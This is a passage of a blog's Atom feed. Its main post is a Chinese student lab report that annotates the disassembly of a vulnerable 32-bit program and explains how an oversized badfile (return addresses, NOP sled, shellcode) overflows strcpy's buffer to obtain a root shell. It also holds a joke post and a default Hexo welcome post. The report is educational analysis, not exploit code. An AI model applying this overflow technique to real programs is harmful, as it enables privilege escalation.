class="line"></span><br><span class="line">08048370 &lt;strcpy@plt&gt;:</span><br><span class="line"> 8048370:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048376:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804837b:e9 d0 ff ff ff       jmp    8048350 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><h6 id="从main开始到-call-fread"><a href="#从main开始到-call-fread" class="headerlink" title="从main开始到 call fread"></a>从main开始到 call fread</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">8048505:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line">8048509:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">将4(%esp)的值赋值给%ecx,并将%esp最低4位清零，从而使栈指针对齐到16字节的边界中，</span><br><span class="line">804850c:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line">804850f:55                   push   %ebp</span><br><span class="line">8048510:89 e5                mov    %esp,%ebp</span><br><span class="line">将-0x4(%ecx)压栈（将返回地址压栈），将%esp赋值给%ebp，令栈底指向当前位置</span><br><span class="line">8048512:53                   push   %ebx</span><br><span class="line">8048513:51                   push   %ecx</span><br><span class="line">将%ebx，%ecx压栈</span><br><span class="line">8048514:81 ec 10 02 00 00    sub    $0x210,%esp</span><br><span class="line">将%esp - 528 字节 为局部变量(str badfile分配空间)</span><br><span class="line">804851a:e8 f1 fe ff ff       call   8048410 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">804851f:81 c3 e1 1a 00 00    add    $0x1ae1,%ebx</span><br><span class="line"></span><br><span class="line">8048525:83 ec 08             sub    $0x8,%esp</span><br><span class="line">8048528:8d 83 20 e6 ff ff    lea    -0x19e0(%ebx),%eax</span><br><span class="line">804852e:50                   push   %eax</span><br><span class="line">804852f:8d 83 22 e6 ff ff    lea    -0x19de(%ebx),%eax</span><br><span class="line">8048535:50                   push   %eax</span><br><span class="line">将两个字符串参数压入栈中</span><br><span class="line">8048536:e8 65 fe ff ff       call   80483a0 &lt;fopen@plt&gt;</span><br><span class="line">调用fopen函数</span><br><span class="line">804853b:83 c4 10             add    $0x10,%esp</span><br><span class="line">恢复栈指针</span><br><span class="line">804853e:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line">将fopen返回值存入-0xc(%ebp)中</span><br><span class="line">8048541:ff 75 f4             pushl  -0xc(%ebp)</span><br><span class="line">将文件指针压栈</span><br><span class="line">8048544:68 05 02 00 00       push   $0x205</span><br><span class="line">缓冲区buffer长度</span><br><span class="line">8048549:6a 01                push   $0x1</span><br><span class="line">参数个数</span><br><span class="line">804854b:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax</span><br><span class="line">将-0x211(%ebp)地址赋给eax</span><br><span class="line">8048551:50                   push   %eax</span><br><span class="line">8048552:e8 09 fe ff ff       call   8048360 &lt;fread@plt&gt;</span><br><span class="line">8048557:83 c4 10             add    $0x10,%esp</span><br><span class="line">恢复栈指针</span><br></pre></td></tr></table></figure><h6 id="调用fread后，调用bof之前的栈状态"><a href="#调用fread后，调用bof之前的栈状态" class="headerlink" title="调用fread后，调用bof之前的栈状态"></a>调用fread后，调用bof之前的栈状态</h6><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423220206902.png" alt="image-20230423220206902"></p><h6 id="进入bof，在bof内调用strcpy之前"><a href="#进入bof，在bof内调用strcpy之前" class="headerlink" title="进入bof，在bof内调用strcpy之前"></a>进入bof，在bof内调用strcpy之前</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">804855a:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">804855d:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax</span><br><span class="line">8048563:50                   push   %eax</span><br><span class="line">8048564:e8 6d ff ff ff       call   80484d6 &lt;bof&gt;</span><br><span class="line"></span><br><span class="line">080484d6 &lt;bof&gt;:</span><br><span class="line">80484d6:55                   push   %ebp</span><br><span class="line">保存栈底指针(返回地址)</span><br><span class="line">80484d7:89 e5                mov    %esp,%ebp</span><br><span class="line">更新栈底指针</span><br><span class="line">80484d9:53                   push   %ebx</span><br><span class="line">80484da:83 ec 24             sub    $0x24,%esp</span><br><span class="line">向下移动36字节</span><br><span class="line">80484dd:e8 ab 00 00 00       call   804858d &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">80484e2:05 1e 1b 00 00       add    $0x1b1e,%eax</span><br><span class="line">80484e7:83 ec 08             sub    $0x8,%esp</span><br><span class="line">向下移动8字节</span><br><span class="line">80484ea:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line">将参数压栈</span><br><span class="line">80484ed:8d 55 e0             lea    -0x20(%ebp),%edx</span><br><span class="line">80484f0:52                   push   %edx</span><br><span class="line">80484f1:89 c3                mov    %eax,%ebx</span><br><span class="line">80484f3:e8 78 fe ff ff       call   8048370 &lt;strcpy@plt&gt;</span><br></pre></td></tr></table></figure><p>将返回地址，前栈帧指针压栈，再压栈buffer[24]</p><p>栈状态如图所示</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423232937275.png" alt="image-20230423232937275"></p><h6 id="进入bof-后，call-strcpy后，ret之前"><a href="#进入bof-后，call-strcpy后，ret之前" class="headerlink" title="进入bof 后，call strcpy后，ret之前"></a>进入bof 后，call strcpy后，ret之前</h6><p>汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">80484f8:83 c4 10             add    $0x10,%esp</span><br><span class="line">80484fb:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">8048500:8b 5d fc             mov    -0x4(%ebp),%ebx</span><br><span class="line">8048503:c9                   leave  </span><br><span class="line">8048504:c3                   ret    </span><br></pre></td></tr></table></figure><p>恢复栈指针，将返回值保存到ebx中，返回</p><p>如果没有出现栈溢出情况下，执行leave，%ebp被弹出，程序正常返回，并回到主函数执行后续代码</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423233030079.png" alt="image-20230423233030079"></p><p>如果strcpy过程中，造成了栈溢出，那么buffer以上的内容都将被badfile中的内容覆盖，badfile由一系列返回地址（恶意代码切入地址）+ 一系列NOP + shellcode构成</p><p>此时，栈溢出后的栈状态如图所示</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423231852516.png" alt="image-20230423231852516"></p><p>利用了栈溢出漏洞，执行了shellcode，获取了shell</p><h6 id="从-bof-返回-main-后"><a href="#从-bof-返回-main-后" class="headerlink" title="从 bof 返回 main 后"></a>从 bof 返回 main 后</h6><p>如果程序没有栈溢出覆写栈上的内容，程序可以正常返回到主函数中，并执行后续代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">8048569:83 c4 10             add    $0x10,%esp</span><br><span class="line">804856c:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">804856f:8d 83 2a e6 ff ff    lea    -0x19d6(%ebx),%eax</span><br><span class="line">8048575:50                   push   %eax</span><br><span class="line">8048576:e8 05 fe ff ff       call   8048380 &lt;puts@plt&gt;</span><br><span class="line">804857b:83 c4 10             add    $0x10,%esp</span><br><span class="line">804857e:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">8048583:8d 65 f8             lea    -0x8(%ebp),%esp</span><br><span class="line">8048586:59                   pop    %ecx</span><br><span class="line">8048587:5b                   pop    %ebx</span><br><span class="line">8048588:5d                   pop    %ebp</span><br><span class="line">8048589:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line">804858c:c3                   ret    </span><br></pre></td></tr></table></figure><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423233233985.png" alt="image-20230423233233985"></p><p>如果栈溢出，造成了ebp， 返回地址等一系列数据被覆盖，那么无法返回到主函数中，而被引导到shellcode中执行shell，栈溢出被利用。</p><p>关于栈溢出攻击时如何实现的：在调用bof函数之后，bof函数中的buffer大小只有24个字节，由于strcpy函数执行时直到复制到’&#x2F;0’时才会停止执行，而注入的badfile大小远大于buffer本身的大小，在栈上分配的地址空间无法容纳下badfile所有的内容，造成了复制字符串时的栈溢出，将badfile中的内容不断复制到栈上，导致其覆盖了原本的ebp，返回地址等关键数据，取而代之的时另一个返回地址（恶意代码的切入地址）， 一系列NOP指令，和shellcode代码，当bof执行完strcpy函数后，将要执行返回到主函数的指令时，由于栈上弹出的返回地址被新的地址覆盖，变成了恶意代码的切入地址（NOP中），造成了返回函数时，被跳转到了NOP中，而NOP没有其他作用，只是不断向下一条指令地址增加执行下一条指令，不断向栈上延伸，直到进入并执行了shellcode，从而被攻击者获得了shell，在root权限下执行任意指令，成功完成了栈溢出攻击。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;软件与系统安全上机作业1–栈溢出利用的分析报告&quot;&gt;&lt;a href=&quot;#软件与系统安全上机作业1–栈溢出利用的分析报告&quot; class=&quot;headerlink&quot; title=&quot;软件与系统安全上机作业1–栈溢出利用的分析报告&quot;&gt;&lt;/a&gt;软件与系统安全上机作业1–栈溢出利</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大帅哥MILK</title>
    <link href="http://example.com/2023/04/15/frist/"/>
    <id>http://example.com/2023/04/15/frist/</id>
    <published>2023-04-15T01:36:12.000Z</published>
    <updated>2023-04-15T01:37:06.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id="论milk为什么这么帅"><a href="#论milk为什么这么帅" class="headerlink" title="论milk为什么这么帅"></a>论milk为什么这么帅</h2><p>天生丽质难自弃</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;论milk为什么这么帅&quot;&gt;&lt;a href=&quot;#论milk为什么这么帅&quot; class=&quot;headerlink&quot; title=&quot;论milk为什么这么帅&quot;&gt;&lt;/a&gt;论milk为什么这么帅&lt;/h2&gt;&lt;p&gt;天生丽质难自弃&lt;/p&gt;
</summary>
      
    
    
    
    <category term="milk" scheme="http://example.com/categories/milk/"/>
    
    
    <category term="man" scheme="http://example.com/tags/man/"/>
    
    <category term="beautiful" scheme="http://example.com/tags/beautiful/"/>
    
    <category term="..." scheme="http://example.com/tags/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/04/15/hello-world/"/>
    <id>http://example.com/2023/04/15/hello-world/</id>
    <published>2023-04-15T01:09:52.034Z</published>
    <updated>2023-04-15T01:31:54.051Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><p>hello</p><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
